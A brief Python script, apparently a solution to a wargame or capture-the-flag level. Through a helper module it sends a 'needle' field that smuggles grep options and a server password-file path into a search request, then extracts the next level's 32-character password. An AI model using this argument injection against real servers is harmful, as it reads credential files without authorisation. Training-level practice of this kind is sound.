import Auther
# -h no file names
Auther.passwordLineGetter(
    Auther.request(10, data={"needle": f'-hE "[[:alnum:]]{32}" {Auther.authPathOnServer(11)}'}), 11)()
